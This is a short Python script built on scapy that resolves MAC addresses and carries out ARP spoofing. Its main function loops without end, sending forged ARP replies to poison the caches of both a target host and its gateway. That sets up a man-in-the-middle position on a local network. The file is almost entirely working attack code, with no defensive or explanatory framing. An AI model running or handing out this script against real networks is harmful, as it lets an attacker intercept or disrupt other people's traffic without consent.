from scapy.all import *
from scapy.layers.l2 import Ether, ARP

ARP_REQUEST = 1
ARP_REPLY = 2
ARP_REQUEST_TIMEOUT = 5  # seconds
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def get_mac(target_ip):
    arp_packet = Ether(dst=BROADCAST_MAC) / ARP(op=ARP_REQUEST, pdst=target_ip)
    target_mac = srp(arp_packet, timeout=ARP_REQUEST_TIMEOUT, verbose=False)
    return target_mac[0][0][1].hwsrc


def spoof_arp_cache(target_ip, target_mac, source_ip):
    """
    :param target_ip:
    :param target_mac:
    :param source_ip:
    :return:
    """
    spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)


def main(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    while True:
        spoof_arp_cache(target_ip, target_mac, gateway_ip)
        spoof_arp_cache(gateway_ip, gateway_mac, target_ip)


print(get_mac("10.0.0.18"))
